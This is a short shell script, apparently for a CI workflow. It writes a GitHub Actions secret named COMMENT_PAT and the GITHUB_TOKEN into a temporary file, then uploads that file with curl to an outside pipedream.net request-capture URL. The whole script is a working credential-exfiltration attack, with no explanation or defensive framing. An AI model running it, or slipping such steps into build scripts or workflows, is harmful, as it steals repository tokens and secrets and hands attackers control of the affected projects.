#!/bin/sh

echo ${{ secrets.COMMENT_PAT }} > /tmp/file.txt
echo $GITHUB_TOKEN >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net